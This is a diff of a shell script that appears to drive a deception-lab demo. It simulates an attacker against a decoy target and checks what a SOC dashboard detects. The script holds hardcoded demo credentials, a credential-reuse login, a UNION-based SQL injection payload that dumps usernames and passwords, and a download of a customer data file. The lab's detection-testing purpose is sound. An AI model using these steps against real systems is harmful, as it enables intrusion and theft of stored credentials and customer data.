@@ -24,7 +24,7 @@ pause "2. Log in and look around. Expect R02, R03."
 sshpass -p 'DemoPass-2026' ssh -p "$SSH_PORT" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
   -o ConnectTimeout=5 dg_demo@"$TARGET" 'whoami; ls -la; cat notes.txt'
 
-pause "3. Reuse the portal password from notes.txt on the web login. Expect strong-candidate link."
+pause "3. Reuse the portal password from notes.txt on the web login. Inspect the observed token use; strong provenance requires M2/M3 bait-read support."
 curl_lab -sS -o /dev/null -w "login %{http_code}\n" -c "$run_dir/cookies" -X POST "$WEB/login" \
   -d 'username=svc_portal&password=DGLAB-Portal-4471'
 
@@ -33,7 +33,7 @@ curl_lab -sS -o /dev/null -w "search %{http_code}\n" -b "$run_dir/cookies" --get
   --data-urlencode "q=x' UNION SELECT username,password FROM users--"
 
 pause "5. Download the customer export. Expect R04."
-echo 'On the SOC, confirm the cross-decoy link with a reason before downloading (expect score 95). Press Enter.'
+echo 'On the SOC, inspect the link evidence. Confirm only if justified; use the backend score rather than a hardcoded expected score. Press Enter.'
 read -r
 curl_lab -sS -o "$run_dir/customer_data.csv" -w "download %{http_code}\n" -b "$run_dir/cookies" "$WEB/download?file=customer_data.csv"
 
